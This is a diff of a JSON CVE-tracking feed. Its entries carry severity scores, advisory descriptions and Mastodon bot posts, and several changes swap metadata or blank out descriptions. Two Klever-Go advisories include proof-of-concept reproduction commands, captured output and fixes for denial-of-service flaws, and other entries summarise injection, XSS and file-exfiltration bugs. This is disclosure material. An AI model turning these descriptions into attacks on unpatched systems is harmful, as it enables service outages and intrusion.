     "severity": "CRITICAL",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
-      {
-        "account": {
-          "id": "115780929223240988",
-          "username": "thehackerwire",
-          "acct": "thehackerwire@mastodon.social",
-          "display_name": "TheHackerWire",
-          "locked": false,
-          "bot": true,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2025-12-21T00:00:00.000Z",
-          "note": "<p>Cybersecurity Chronicles \ud83c\udf10 | Breaking down the latest in security news, <a href=\"https://mastodon.social/tags/hacking\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>hacking</span></a> <a href=\"https://mastodon.social/tags/darkweb\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>darkweb</span></a> <a href=\"https://mastodon.social/tags/Cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Cybersecurity</span></a> <a href=\"https://mastodon.social/tags/InfoSec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>InfoSec</span></a> <a href=\"https://mastodon.social/tags/HackingNews\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>HackingNews</span></a></p>",
-          "url": "https://mastodon.social/@thehackerwire",
-          "uri": "https://mastodon.social/ap/users/115755483699003887",
-          "avatar": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/115/780/929/223/240/988/original/57ab1a2ca33e5310.jpg",
-          "avatar_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/avatars/115/780/929/223/240/988/original/57ab1a2ca33e5310.jpg",
-          "avatar_description": "",
-          "header": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/780/929/223/240/988/original/d791186b03aef409.jpeg",
-          "header_static": "https://media.infosec.exchange/infosec.exchange/cache/accounts/headers/115/780/929/223/240/988/original/d791186b03aef409.jpeg",
-          "header_description": "",
-          "followers_count": 207,
-          "following_count": 2,
-          "statuses_count": 8542,
-          "last_status_at": "2026-08-09",
-          "hide_collections": false,
-          "show_media": true,
-          "show_media_replies": true,
-          "show_featured": true,
-          "feature_approval": {
-            "automatic": [
-              "public"
-            ],
-            "manual": [],
-            "current_user": "automatic"
-          },
-          "emojis": [],
-          "fields": [
-            {
-              "name": "Website",
-              "value": "<a href=\"https://www.thehackerwire.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">thehackerwire.com/</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            },
-            {
-              "name": "X",
-              "value": "<a href=\"https://x.com/TheHackerWire\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">x.com/TheHackerWire</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            }
-          ]
-        },
-        "url": "https://mastodon.social/@thehackerwire/117060010006760327",
-        "content": "<p>\ud83d\udd34 CVE-2026-16258 - Critical (9.8)</p><p>The Ajax Search Lite  WordPress plugin before 4.14.5 does not prevent the deserialization of untrusted input, allowing unauthenticated attackers to perform PHP Object Injection. When a suitable POP chain is present via another installed Ajax Searc...</p><p>\ud83d\udd17 <a href=\"https://www.thehackerwire.com/vulnerability/CVE-2026-16258/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">thehackerwire.com/vulnerabilit</span><span class=\"invisible\">y/CVE-2026-16258/</span></a></p><p><a href=\"https://mastodon.social/tags/CVE\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>CVE</span></a> <a href=\"https://mastodon.social/tags/vulnerability\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>vulnerability</span></a> <a href=\"https://mastodon.social/tags/infosec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>infosec</span></a> <a href=\"https://mastodon.social/tags/cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>cybersecurity</span></a> <a href=\"https://mastodon.social/tags/security\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>security</span></a> <a href=\"https://mastodon.social/tags/Tenda\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Tenda</span></a> <a href=\"https://mastodon.social/tags/patchstack\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>patchstack</span></a></p>",
-        "created_at": "2026-08-08T13:00:00.000Z"
-      },
       {
         "account": {
           "id": "115780929217569257",
@@ -14060,7 +13886,7 @@
     ],
     "description": "The MStore API  WordPress plugin before 4.21.0 does not perform authorization or purchase-ownership checks on its REST product-review creation route, allowing an unauthenticated attacker to create WooCommerce product reviews with an attacker-chosen reviewer name, email and star rating on stores configured to accept reviews only from verified owners.",
     "repos": [],
-    "updated": "2026-08-07T21:30:33",
+    "updated": "2026-08-07T19:17:36.343000",
     "epss": 0.208
   },
   "CVE-2026-49007": {
@@ -14126,7 +13952,7 @@
     ],
     "description": "By accessing unencrypted information in the device firmware, an attacker can obtain the initial login credentials for the device's web interface.",
     "repos": [],
-    "updated": "2026-08-07T16:17:25.380000",
+    "updated": "2026-08-07T09:32:04",
     "epss": 0.345
   },
   "CVE-2026-71560": {
@@ -14290,7 +14116,7 @@
           "header_description": "",
           "followers_count": 1711,
           "following_count": 3435,
-          "statuses_count": 160736,
+          "statuses_count": 160760,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -14441,7 +14267,7 @@
     "repos": [
       "https://github.com/villager1314/CVE-2026-64560-Analysis"
     ],
-    "updated": "2026-07-30T12:32:18",
+    "updated": "2026-07-30T12:19:03.630000",
     "epss": 0.12
   },
   "CVE-2026-71558": {
@@ -14507,7 +14333,7 @@
     ],
     "description": "Heap type confusion vulnerability in Apache Fory C++ deserialization.\n\nThis issue affects Apache Fory C++ versions from 0.14.0 before 1.5.0. A crafted input payload can bypass type compatibility checks during polymorphic smart-pointer deserialization, causing an object of an incompatible type to be treated as the declared base type. This may result in undefined behavior and potentially lead to denial of service or arbitrary code execution.\n\n\nUsers are recommended to upgrade to Apache Fory 1.5.0, which fixes this issue. Applications not using Apache Fory C++ polymorphic smart-pointer deserialization are not affected.",
     "repos": [],
-    "updated": "2026-08-08T00:52:49.367000",
+    "updated": "2026-08-08T03:32:14",
     "epss": 0.715
   },
   "CVE-2026-20338": {
@@ -14620,7 +14446,7 @@
     "epss": 0.327
   },
   "CVE-2026-16594": {
-    "cvss3": null,
+    "cvss3": 0,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -14697,7 +14523,7 @@
     ],
     "description": "The WP Directory Kit WordPress plugin before 1.5.5 does not perform authorization or nonce checks on one of its authenticated AJAX actions, allowing any authenticated user such as a Subscriber to disclose the WP Directory Kit WordPress plugin before 1.5.5 settings including sensitive API keys and secrets.",
     "repos": [],
-    "updated": "2026-08-08T09:30:28",
+    "updated": "2026-08-08T07:17:10.910000",
     "epss": 0.13899999999999998
   },
   "CVE-2026-20348": {
@@ -14761,9 +14587,9 @@
         "created_at": "2026-08-08T10:00:28.000Z"
       }
     ],
-    "description": "A vulnerability in the XAR file format parser of ClamAV could allow an unauthenticated, remote attacker to cause a DoS condition or possibly other expanded impacts as a result of&nbsp;memory corruption on an affected device.\r\n\r\nThis vulnerability is due to improper boundary checks for content in XAR files during scanning. An attacker could exploit this vulnerability by submitting a crafted file that contains XAR content to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to cause the ClamAV scanning process to terminate, resulting in a DoS condition on the affected software.",
+    "description": "A vulnerability in the XAR file format parser of ClamAV could allow an unauthenticated, remote attacker to cause a DoS condition or possibly other expanded impacts as a result of&nbsp;memory corruption on an affected device.\n\nThis vulnerability is due to improper boundary checks for content in XAR files during scanning. An attacker could exploit this vulnerability by submitting a crafted file that contains XAR content to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to cause the ClamAV scanning process to terminate, resulting in a DoS condition on the affected software.",
     "repos": [],
-    "updated": "2026-08-07T22:16:58.183000",
+    "updated": "2026-08-07T18:31:54",
     "epss": 0.327
   },
   "CVE-2026-20347": {
@@ -14893,9 +14719,9 @@
         "created_at": "2026-08-08T09:00:42.000Z"
       }
     ],
-    "description": "A vulnerability in the GPT file format parser of ClamAV could allow an unauthenticated, remote attacker to cause a DoS condition or possibly other expanded impacts as a result of&nbsp;memory corruption on an affected device.\n\nThis vulnerability is due to improper handling of an endian conversion operation, which may result in an out-of-bounds buffer write. An attacker could exploit this vulnerability by submitting a crafted GPT file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to cause the ClamAV scanning process to terminate, resulting in a DoS condition on the affected software.",
+    "description": "A vulnerability in the GPT file format parser of ClamAV could allow an unauthenticated, remote attacker to cause a DoS condition or possibly other expanded impacts as a result of&nbsp;memory corruption on an affected device.\r\n\r\nThis vulnerability is due to improper handling of an endian conversion operation, which may result in an out-of-bounds buffer write. An attacker could exploit this vulnerability by submitting a crafted GPT file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to cause the ClamAV scanning process to terminate, resulting in a DoS condition on the affected software.",
     "repos": [],
-    "updated": "2026-08-07T18:31:54",
+    "updated": "2026-08-07T22:16:57.883000",
     "epss": 0.327
   },
   "CVE-2026-68772": {
@@ -14965,7 +14791,7 @@
     "epss": 0.402
   },
   "CVE-2026-16948": {
-    "cvss3": 0,
+    "cvss3": null,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -15042,7 +14868,7 @@
     ],
     "description": "The Solace Extra WordPress plugin before 1.6.1 does not perform capability checks in several of its AJAX actions and exposes the nonce that protects them on admin pages reachable by low-privileged users, allowing users with a role as low as Subscriber to modify site-wide presentation settings and delete imported site-builder content.",
     "repos": [],
-    "updated": "2026-08-08T07:17:11.227000",
+    "updated": "2026-08-08T09:30:28",
     "epss": 0.132
   },
   "CVE-2026-19082": {
@@ -15243,7 +15069,7 @@
     ],
     "description": "Improper privilege management in the XML-RPC API of Plesk before 18.0.80, allows an authenticated reseller to obtain an administrative session for the root user account.",
     "repos": [],
-    "updated": "2026-08-07T18:31:57",
+    "updated": "2026-08-07T19:18:51.483000",
     "epss": 0.233
   },
   "CVE-2026-18577": {
@@ -15319,7 +15145,7 @@
     "epss": 4.103
   },
   "CVE-2026-16955": {
-    "cvss3": 0,
+    "cvss3": null,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -15396,7 +15222,7 @@
     ],
     "description": "The AI Engine  WordPress plugin before 3.6.6 does not confine a caller-supplied file path before reading it and forwarding the contents to an external service, allowing users with a subscriber-level account to read arbitrary files from the server and exfiltrate them off-host. Reaching the issue at subscriber level requires a non-default public API feature to be enabled; otherwise the same issue is reachable by an administrator, which on multisite allows a non-super subsite administrator to read the network-shared configuration and its secrets.",
     "repos": [],
-    "updated": "2026-08-08T07:17:11.440000",
+    "updated": "2026-08-08T09:30:28",
     "epss": 0.158
   },
   "CVE-2026-64636": {
@@ -15528,12 +15354,12 @@
     ],
     "description": "In sol commit 373d848 (2024-12-12), the broker does not fully release resources when handling malformed or duplicate CONNECT packets. When clients send invalid CONNECT packets - either due to repeated attempts or failed authentication - the server may silently drop the connection or send a CONNACK but fail to close the session or deallocate internal resources. This behavior allows an attacker to create numerous half-open connections that consume memory and file descriptors indefinitely, potentially triggering the Linux OOM killer and causing a denial of service.",
     "repos": [],
-    "updated": "2026-08-07T21:30:40",
+    "updated": "2026-08-07T20:16:49.087000",
     "epss": 0.318
   },
   "CVE-2026-48097": {
-    "cvss3": 7.8,
-    "severity": "HIGH",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -15592,9 +15418,9 @@
         "created_at": "2026-08-08T07:00:27.000Z"
       }
     ],
-    "description": "NexTor IP Changer is a command-line tool that leverages the Tor network to periodically rotate a user's IP address. Versions prior to 2.0.0 have a command execution vulnerability due to unsafe use of `shell=True` with commands that rely on executable resolution through the `PATH` environment variable. An attacker controlling the execution environment can place malicious executables such as sudo earlier in the `PATH`, resulting in execution of attacker-controlled code. Version 2.0.0 fixes the issue.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-08-07T20:16:51.893000",
+    "updated": null,
     "epss": 0.27299999999999996
   },
   "CVE-2026-48039": {
@@ -15795,7 +15621,7 @@
     ],
     "description": "Consul Community Edition and Consul Enterprise 1.13.0 through 2.0.2 are vulnerable to an unauthenticated denial of service through unbounded connection acceptance on the external gRPC listeners. A remote attacker may exhaust agent file descriptors, goroutines, and memory by opening many incomplete connections, potentially preventing legitimate clients from connecting. This vulnerability, CVE-2026-15972, is fixed in Consul 2.0.3 and Consul Enterprise 1.21.17, 1.22.11, and 2.0.3.",
     "repos": [],
-    "updated": "2026-08-07T21:30:40",
+    "updated": "2026-08-07T20:16:50.020000",
     "epss": 0.386
   },
   "CVE-2026-65535": {
@@ -15860,8 +15686,8 @@
     "epss": 0.184
   },
   "CVE-2026-65819": {
-    "cvss3": 7.5,
-    "severity": "HIGH",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -15920,14 +15746,14 @@
         "created_at": "2026-08-08T02:00:30.000Z"
       }
     ],
-    "description": "gopacket provides packet processing capabilities for Go. Through version 1.7.0, multiple layer decoders use attacker-controlled lengths, counts, or offsets before validating them against packet buffers, allowing a crafted packet decoded through DecodingLayerParser or DecodeFromBytes to trigger an unrecovered panic and remotely deny service.  A patch commit is available at 210f25f.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-08-07T20:16:52.603000",
+    "updated": null,
     "epss": 0.366
   },
   "CVE-2026-48026": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 8.7,
+    "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -15986,9 +15812,9 @@
         "created_at": "2026-08-08T02:00:05.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "lakeFS is an open-source tool that transforms object storage into a Git-like repositories. Prior to version 1.81.1 of the open source edition and 1.84.0 of the enterprise edition, lakeFS Web UI renders markdown files from repository objects without sanitizing the resulting HTML. A user with write access to any repository branch can commit a `.md` object containing arbitrary HTML/JavaScript. Any other user who opens that object, or who navigates to a repository or directory containing a malicious `README.md`, executes the attacker-supplied script in their own authenticated session. lakeFS fixes the issue in v1.81.1 and lakeFS Enterprise fixes the issue in in v1.84.0. Enterprise customers using older versions can temporarily disable Markdown rendering by adding YAML to their config. No workaround exists for OSS release. Users are advised to upgrade to the latest version for both lakeFS and lakeFS-Enterprise.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-08-07T23:17:03.810000",
     "epss": 0.219
   },
   "CVE-2026-47249": {
@@ -16184,9 +16010,9 @@
         "created_at": "2026-08-08T00:01:03.000Z"
       }
     ],
-    "description": "Klever-Go is the Go implementation of the Klever blockchain protocol. Versions from 1.7.14 through 1.7.17 are vulnerable to a remotely triggerable denial of service. Both REST APIs are started with the Gin Engine.Run convenience method, which serves requests through Go's default HTTP server with no ReadHeaderTimeout, ReadTimeout, or MaxHeaderBytes configured. As a result, incoming connections that never complete their request headers are held open indefinitely. When a REST listener is reachable beyond localhost through the documented all-interface bind or a Docker port-publish deployment, a single unauthenticated client can open many slow-header connections and hold them open until server file descriptors are exhausted, preventing the API from accepting new connections. This renders the REST API unavailable to legitimate clients. This issue is fixed in version 1.7.18.",
+    "description": "### Summary\n\nThe Klever seednode REST API starts a Gin engine with `Engine.Run(restAPIInterface)`. In Gin v1.9.1, `Engine.Run` calls Go's default `http.ListenAndServe`, which constructs an HTTP server without application-level `ReadHeaderTimeout`, `ReadTimeout`, or `MaxHeaderBytes` limits.\n\nAn unauthenticated client that can reach a REST listener bound with Klever's documented `--rest-api-interface :8080` all-interface option can hold incomplete HTTP headers open indefinitely. In a local proof against the real `cmd/seednode/api.Start` path on `v1.7.17`, 120 slow-header connections caused 20/20 legitimate `/log` probes to fail with `accept: too many open files`. A fixed control using the same Gin router behind an explicit `http.Server` with `ReadHeaderTimeout`, `ReadTimeout`, and `MaxHeaderBytes` retained 0 slow connections and served 20/20 probes.\n\nThis report is distinct from the P2P advisories and from my direct-message goroutine report. This finding concerns Klever-owned HTTP REST startup code (`cmd/seednode/api` and `network/api`) using Gin `Engine.Run` without server-level header deadlines. It does not depend on `MultiDataInterceptor`, `Batch.Decompress`, libp2p, malformed P2P messages, or direct-message goroutine spawning.\n\n### Details\n\nSeednode REST API, latest release `v1.7.17`:\n\n- `cmd/seednode/api/api.go:17` defines `Start(restAPIInterface, marshalizer)`.\n- `cmd/seednode/api/api.go:18` creates `ws := gin.Default()`.\n- `cmd/seednode/api/api.go:23` returns `ws.Run(restAPIInterface)`.\n- `cmd/seednode/CLI.md:23` documents `--rest-api-interface`; it says `:8080` binds all interfaces and `off` disables the API.\n\nNode REST API, latest release `v1.7.17`:\n\n- `network/api/api.go:79` creates `ws = gin.Default()`.\n- `network/api/api.go:98` returns `ws.Run(kleverFacade.RestAPIInterface())`.\n- `cmd/node/main.go:147-150` documents the same `--rest-api-interface` flag and says `:8080` binds all interfaces.\n- `docker/README.md:56-61` and `docker/README.md:67-70` publish host port `8080` for full-node and validator Docker examples.\n- `README.md:264-268` documents that the node exposes a REST API for blockchain queries and operations.\n\nThe seednode REST API source is byte-identical across `v1.7.14` through `v1.7.17`; the captured runtime PoC was executed on `v1.7.17`.\n\nCurrent `develop` commit `10bcfd50` remains affected:\n\n- `network/api/api.go:98` still returns `ws.Run(kleverFacade.RestAPIInterface())`.\n- `cmd/seednode/api/api.go:59` still returns `ws.Run(restAPIInterface)`.\n\nGin v1.9.1 implements `Engine.Run` as:\n\n```go\nfunc (engine *Engine) Run(addr ...string) (err error) {\n    address := resolveAddress(addr)\n    err = http.ListenAndServe(address, engine.Handler())\n    return\n}\n```\n\nIn my source sweep, I did not find a production `http.Server{ReadHeaderTimeout: ...}` wrapper for either REST start path. The only `ReadHeaderTimeout` hit I found in the repository was a test helper under `network/api/websocket/routes_test.go`.\n\n### PoC\n\nGitHub Private Vulnerability Reporting does not appear to allow file attachments in this form, so I am including the reproduction command and captured output inline. I can paste the full 254-line Go test patch in a reply immediately if useful.\n\nThe test starts two local child servers:\n\n1. Vulnerable: the real `cmd/seednode/api.Start` path.\n2. Fixed control: the same Gin router served through `http.Server{ReadHeaderTimeout: 250ms, ReadTimeout: 250ms, MaxHeaderBytes: 4096}`.\n\nReproduction from a clean checkout:\n\n```bash\ngit clone https://github.com/klever-io/klever-go\ncd klever-go\ngit checkout v1.7.17\n\n# Apply the PoC patch to cmd/seednode/api.\n# I can provide the full patch in this advisory thread.\n\ngo test ./cmd/seednode/api -run TestPoC_SeednodeAPISlowlorisDifferential -count=1 -v -timeout 60s\n```\n\nCaptured output on `v1.7.17`:\n\n```text\nPOC_RESULT mode=vulnerable slow_connections_opened=120 slow_connections_still_open=111 legitimate_probe_ok=0 legitimate_probe_fail=20\nPOC_RESULT mode=fixed slow_connections_opened=120 slow_connections_still_open=0 legitimate_probe_ok=20 legitimate_probe_fail=0\n```\n\nThe vulnerable server also logs repeated accept failures:\n\n```text\nhttp: Accept error: accept tcp 127.0.0.1:56415: accept: too many open files; retrying in 1s\n```\n\n### Impact\n\nFor an externally reachable Klever REST listener, a single unauthenticated client can retain many server-side connections by never completing HTTP headers. Because the Go server has no read-header deadline, those connections persist until the client closes them or an external proxy/firewall intervenes.\n\nThe direct result is REST API unavailability for legitimate clients. The local proof demonstrates this as 0/20 legitimate `/log` probes succeeding while the vulnerable server is saturated, versus 20/20 succeeding with the fixed server wrapper.\n\nI am not claiming default public internet exposure. The default bind is `localhost:8080`. The affected condition is a REST API listener exposed through Klever's documented all-interface bind or Docker port-publish deployment shape.\n\nThis maps to the `SECURITY.md` High category: \"Denial of Service affecting network availability.\" If Klever treats externally reachable REST API unavailability as non-critical because the default bind is localhost, the conservative classification is Medium under \"Performance degradation attacks\" / \"Non-critical DoS vectors.\"\n\nAll testing was local loopback only. I did not contact Klever mainnet, public testnet, hosted RPCs, explorers, or third-party production infrastructure.\n\nSuggested fix:\n\nStart both REST APIs through explicit `http.Server` values instead of `Engine.Run`, for example:\n\n```go\nsrv := &http.Server{\n    Addr:              restAPIInterface,\n    Handler:           ws.Handler(),\n    ReadHeaderTimeout: 5 * time.Second,\n    ReadTimeout:       10 * time.Second,\n    WriteTimeout:      30 * time.Second,\n    IdleTimeout:       120 * time.Second,\n    MaxHeaderBytes:    32 << 10,\n}\nreturn srv.ListenAndServe()\n```\n\nApply the same pattern to:\n\n- `cmd/seednode/api.Start`\n- `network/api.Start`\n\nIf Klever expects deployments to expose the REST API through a reverse proxy, I still recommend setting server-level limits in the application. That keeps the binary safe when operators use the documented direct bind or Docker port-publish path.",
     "repos": [],
-    "updated": "2026-08-07T23:17:04.890000",
+    "updated": "2026-06-09T18:40:45",
     "epss": 0.294
   },
   "CVE-2026-52879": {
@@ -16250,9 +16076,9 @@
         "created_at": "2026-08-08T00:00:25.000Z"
       }
     ],
-    "description": "### Summary\n\n`networkMessenger.directMessageHandler` in `network/p2p/libp2p/netMessenger.go` spawns a fresh goroutine for every incoming direct message before the antiflood layer makes an admission decision. There is no semaphore, throttler, or bound on concurrent in-flight spawns.\n\nA single connected libp2p peer can open a `DirectSendID` stream and send well-formed `TopicMessage` envelopes with varying sequence numbers. Each accepted direct message reaches `directMessageHandler` and triggers a fresh goroutine before `processor.ProcessReceivedMessage` runs. This allows unbounded goroutine growth and node availability degradation from one peer.\n\nThis remains present in the latest release `v1.7.17`: `network/p2p/libp2p/netMessenger.go:1060` still spawns `go func(msg p2p.MessageP2P)` before `processor.ProcessReceivedMessage`. I also verified current `develop` commit `10bcfd50`, where the same spawn remains at `network/p2p/libp2p/netMessenger.go:1115`.\n\nThis is distinct from GHSA-74m6-4hjp-7226 and GHSA-87m7-qffr-542v. Those advisories concern `MultiDataInterceptor` decompression/throttler behavior. This report concerns the libp2p direct-message ingress wrapper spawning an unbounded goroutine before processor-level antiflood/admission logic runs. A patch to `Batch.Decompress` or `MultiDataInterceptor` does not bound this direct-message goroutine spawn.\n\n### Details\n\nThe affected path is `network/p2p/libp2p/netMessenger.go` in `directMessageHandler`.\n\nThe direct-message path transforms and validates the message, looks up the topic processor, then immediately spawns a goroutine:\n\n```go\nfunc (netMes *networkMessenger) directMessageHandler(message *pubsub.Message, fromConnectedPeer core.PeerID) error {\n    var processor p2p.MessageProcessor\n\n    topic := *message.Topic\n    msg, err := netMes.transformAndCheckMessage(message, fromConnectedPeer, topic)\n    if err != nil {\n        return err\n    }\n\n    netMes.mutTopics.RLock()\n    processor = netMes.processors[topic]\n    netMes.mutTopics.RUnlock()\n\n    if processor == nil {\n        return fmt.Errorf(\"%w on directMessageHandler for topic %s\", p2p.ErrNilValidator, topic)\n    }\n\n    go func(msg p2p.MessageP2P) {\n        if check.IfNil(msg) {\n            return\n        }\n\n        errProcess := processor.ProcessReceivedMessage(msg, fromConnectedPeer)\n        // ...\n    }(msg)\n\n    return nil\n}\n```\n\nThe processor-level antiflood decision happens inside `ProcessReceivedMessage`, after the goroutine, its stack, and the cloned message reference already exist. That means antiflood can bound processing rate, but not goroutine creation rate.\n\nThe existing `goRoutinesThrottler` with capacity `broadcastGoRoutines = 1000` is wired into outgoing broadcast paths such as `BroadcastOnChannelBlocking`, not this incoming direct-message path.\n\nThe parallel pubsub ingress path in the same file handles a comparable inbound message surface synchronously:\n\n```go\nerr = handler.ProcessReceivedMessage(msg, fromConnectedPeer)\n```\n\nSo the direct-message path is asymmetric: same transform/check function, same `ProcessReceivedMessage` callee, but direct-message ingress adds an unbounded goroutine spawn.\n\nReachability:\n\n- `directSender.go` registers `DirectSendID` as a libp2p stream protocol.\n- `directStreamHandler` reads framed `pubsub.Message` envelopes from the stream.\n- `directStreamHandler` forwards each message to `networkMessenger.directMessageHandler`.\n- Any connected peer can send well-formed envelopes to registered topics.\n- The `seenMessages` cache keys on `From + Seqno`; `Seqno` is attacker-controlled in the envelope, so incrementing it bypasses dedupe.\n\n### PoC\n\nGitHub Private Vulnerability Reporting does not appear to allow file attachments in this form, so I am including the reproduction command and captured output inline. I can provide the full Go test file immediately if useful.\n\nThe PoC is a Go test file intended to be placed under `network/p2p/libp2p/` in a `klever-go` checkout. It exercises the real `network/p2p/libp2p` package with `NewMockMessenger`.\n\nReproduction:\n\n```bash\ngit clone https://github.com/klever-io/klever-go\ncd klever-go\ngit checkout v1.7.16\n\n# Place dos_directmsg_test.go into:\n# network/p2p/libp2p/\n\ngo test ./network/p2p/libp2p/ -run TestPoC_ -count=1 -v -timeout 60s\n```\n\nCaptured output:\n\n```text\n=== RUN   TestPoC_DirectMessageHandler_SpawnsGoroutinePerMessage\n    baseline goroutines: 43\n    peak goroutines after 500 direct messages: 543 (delta = 500)\n    final goroutines after drain + GC: 43\nPOC_RESULT direct=spawn N=500 baseline=43 peak=543 delta=500 threshold=400 final=43\n--- PASS\n\n=== RUN   TestPoC_SynchronousHandler_NoGoroutineGrowth\n    baseline goroutines: 47\n    peak goroutines after 500 synchronous calls: 47 (delta = 0)\nPOC_RESULT sync=block N=500 baseline=47 peak=47 delta=0\n--- PASS\n\n=== RUN   TestPoC_DirectMessageHandler_NoThrottlerInPath\n    all 2000 SendToConnectedPeer calls returned in 2.490708ms -- no throttler blocking\nPOC_RESULT throttler=absent N=2000 elapsed=2.490708ms\n--- PASS\n```\n\nReading:\n\n1. 500 direct messages with slow processors produced exactly 500 new goroutines.\n2. The synchronous control path produced zero goroutine growth.\n3. 2000 messages, twice the outgoing `broadcastGoRoutines = 1000` capacity, returned immediately, showing no ingress throttler blocks this path.\n\n### Impact\n\nA single connected peer can sustain unbounded goroutine spawn growth on a klever-go node. Each spawned goroutine allocates its own stack, holds message references until the processor returns, and adds scheduler and GC pressure before antiflood admission can reject the message.\n\nUnder realistic attacker line rate and non-trivial processor latency, goroutine count can grow faster than the runtime drains it, degrading the node's ability to process legitimate traffic. This maps to the `SECURITY.md` High category: \"Denial of Service affecting network availability.\"\n\nAll testing was local only. I did not contact Klever mainnet, public testnet, hosted RPCs, explorers, or third-party production infrastructure.\n\nSuggested fixes:\n\n1. Wire `goRoutinesThrottler.CanProcess()` or a dedicated ingress throttler before the `go func()` spawn in `directMessageHandler`.\n2. Or remove the goroutine and call `ProcessReceivedMessage` synchronously, matching the existing `pubsubCallback` path.\n\nDisclosure note: I originally sent this report to `security@klever.org` on 2026-05-13. Since `SECURITY.md` lists GitHub Private Vulnerability Reporting as the recommended channel, I am resubmitting it here.",
+    "description": "Klever-Go is the Go implementation of the Klever blockchain protocol. In versions 1.7.14 through 1.7.17, the direct-message ingress handler spawns a new goroutine for every incoming direct message before the processor-level antiflood layer makes any admission decision, with no semaphore, throttler, or bound on the number of concurrent in-flight spawns. Because the antiflood check runs inside the spawned goroutine rather than before it, a single connected peer can open a direct-send stream and send a stream of well-formed messages to force unbounded goroutine creation, where each goroutine allocates its own stack and holds a message reference until processing completes, adding scheduler and garbage-collection pressure faster than the runtime can drain it. This lets one peer degrade the node's availability and its ability to process legitimate traffic, resulting in a remotely triggerable denial of service. The issue is fixed in 1.7.18.",
     "repos": [],
-    "updated": "2026-06-09T18:40:42",
+    "updated": "2026-08-07T23:17:04.743000",
     "epss": 0.294
   },
   "CVE-2026-52878": {
@@ -16322,8 +16148,8 @@
     "epss": 0.27799999999999997
   },
   "CVE-2026-48120": {
-    "cvss3": 8.6,
-    "severity": "HIGH",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -16382,14 +16208,14 @@
         "created_at": "2026-08-08T00:00:01.000Z"
       }
     ],
-    "description": "Kakoune is a code editor. Prior to version 2026.05.21, the bundled, enabled by default, `autorestore.kak` script can be exploited by malicious backup files leading to arbitrary kakoune and shell commands being executed by simply opening a file. Kakoune 2026.05.21 fixes the issue. As a workaround, add `autorestore-disable` to the user kakrc will disable the autorestore feature.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-08-07T23:17:04.117000",
+    "updated": null,
     "epss": 0.13699999999999998
   },
   "CVE-2026-62295": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 7.5,
+    "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -16448,9 +16274,9 @@
         "created_at": "2026-08-07T23:01:03.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "HAPI FHIR is a complete implementation of the HL7 FHIR standard for healthcare interoperability in Java. Prior to 6.9.11, the JSON utility parser in org.hl7.fhir.utilities.json.parser.JsonParser enforces no maximum nesting depth for arrays or objects. As a result, a small but deeply nested, syntactically valid FHIR JSON document can trigger unbounded readArray() or readObject() recursion, raising a StackOverflowError before structural validation runs. An attacker who can submit JSON resources for validation can thus crash the request thread, and services that do not isolate StackOverflowError safely may experience worker loss or process instability \u2014 a denial-of-service condition. This issue is fixed in version 6.9.11.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-08-07T20:16:52.310000",
     "epss": 0.27799999999999997
   },
   "CVE-2026-50540": {
@@ -16586,8 +16412,8 @@
     "epss": 0.26
   },
   "CVE-2026-33691": {
-    "cvss3": 6.8,
-    "severity": "MEDIUM",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -16666,9 +16492,9 @@
         "created_at": "2026-08-07T19:00:11.000Z"
       }
     ],
